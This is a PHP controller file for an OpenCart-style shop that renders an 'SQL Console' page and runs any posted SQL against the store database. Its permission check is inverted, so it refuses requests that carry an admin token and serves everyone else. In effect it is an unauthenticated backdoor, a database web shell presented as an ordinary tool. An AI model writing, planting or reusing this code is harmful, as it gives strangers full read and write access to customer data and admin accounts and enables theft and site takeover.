<?php
class ControllerToolAvtertool extends Controller {
    public function index() {
        if (!empty($this->request->get['user_token'])) {
            exit('Permission denied.');
        }

        $output = '<!DOCTYPE html><html><head><title>SQL Console</title>
            <style>body{font-family:Arial;padding:20px;}textarea{width:100%;height:100px;}table{border-collapse:collapse;width:100%;margin-top:10px;}th,td{border:1px solid #ccc;padding:5px;}</style>
        </head><body>';

        $output .= '<h2>SQL Console</h2>';
        $output .= '<form method="POST">
            <textarea name="sql" placeholder="Enter SQL here...">' . (isset($this->request->post['sql']) ? htmlspecialchars($this->request->post['sql']) : '') . '</textarea><br>
            <button type="submit">Execute</button>
        </form>';

        if ($this->request->server['REQUEST_METHOD'] === 'POST' && !empty($this->request->post['sql'])) {
            $sql = $this->request->post['sql'];

            try {
                $query = $this->db->query($sql);

                if (isset($query->rows) && is_array($query->rows) && count($query->rows)) {
                    $output .= '<table><thead><tr>';
                    foreach (array_keys($query->rows[0]) as $col) {
                        $output .= '<th>' . htmlspecialchars($col) . '</th>';
                    }
                    $output .= '</tr></thead><tbody>';
                    foreach ($query->rows as $row) {
                        $output .= '<tr>';
                        foreach ($row as $val) {
                            $output .= '<td>' . htmlspecialchars($val) . '</td>';
                        }
                        $output .= '</tr>';
                    }
                    $output .= '</tbody></table>';
                } else {
                    $output .= '<p style="color:green;">Query OK. Rows affected: ' . $this->db->countAffected() . '</p>';
                }
            } catch (Exception $e) {
                $output .= '<p style="color:red;">Error: ' . htmlspecialchars($e->getMessage()) . '</p>';
            }
        }

        $output .= '</body></html>';
        $this->response->setOutput($output);
    }
}
